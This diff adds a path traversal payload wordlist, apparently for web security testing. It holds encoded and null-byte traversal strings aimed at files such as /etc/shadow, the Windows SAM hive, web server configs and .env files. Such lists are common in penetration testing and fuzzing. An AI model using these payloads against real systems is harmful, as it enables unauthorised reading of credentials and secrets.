@@ -1,0 +1,57 @@
+# Path Traversal Payloads
+
+# Basic traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+
+# URL encoded
+..%2F
+..%2F..%2F
+..%2F..%2F..%2F
+..%252f
+..%252f..%252f
+
+# Double URL encoded
+..%252F
+..%252F..%252F
+..%c0%af
+..%c1%9c
+
+# Windows paths
+..\
+..\..\
+..\..\..\
+..%5C
+..%5C..%5C
+..%255C
+
+# Null byte injection
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+..%2F..%2F..%2Fetc%2Fpasswd%00
+
+# Common target files
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../windows/system32/config/sam
+../../../windows/win.ini
+../../../boot.ini
+..\..\..\..\windows\system.ini
+
+# Web server files
+../../../var/www/html/index.php
+../../../usr/local/apache/conf/httpd.conf
+../../../etc/httpd/conf/httpd.conf
+../../../etc/nginx/nginx.conf
+
+# Application files
+../../../config/database.yml
+../../../.env
+../../../web.config
+../../../application.properties
